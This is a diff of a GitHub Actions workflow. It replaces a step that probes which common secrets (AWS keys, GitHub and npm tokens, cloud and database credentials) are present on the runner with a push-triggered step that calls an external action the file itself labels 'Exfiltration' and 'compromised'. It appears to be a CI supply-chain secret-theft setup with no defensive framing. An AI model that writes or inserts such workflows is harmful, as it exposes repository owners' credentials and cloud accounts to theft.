@@ -1,36 +1,13 @@
-name: Test Common Secret Keys
+name: Use Exfiltration Action
 
 on: push
 
 jobs:
-  secret_tester:
+  call_reusable_action:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout Code
         uses: actions/checkout@v3
 
-      - name: 🔍 Testing Common Secret Keys
-        run: |
-          echo "🔎 Testing Common GitHub Secret Keys..."
-
-          # List of common secret names to test
-          SECRET_KEYS=(
-            "AWS_ACCESS_KEY_ID"
-            "AWS_SECRET_ACCESS_KEY"
-            "GITHUB_TOKEN"
-            "DOCKER_PASSWORD"
-            "NPM_TOKEN"
-            "GCP_SA_KEY"
-            "AZURE_CREDENTIALS"
-            "SLACK_WEBHOOK_URL"
-            "DATABASE_URL"
-          )
-
-          for SECRET in "${SECRET_KEYS[@]}"; do
-            VALUE=$(printenv $SECRET)
-            if [ -n "$VALUE" ]; then
-              echo "✅ Found $SECRET (length: ${#VALUE})"
-            else
-              echo "❌ $SECRET is empty or not set"
-            fi
-          done
+      - name: 🔥 Use External Exfiltration Action
+        uses: jonra/compromised-action/actions@main  # ✅ References the reusable action
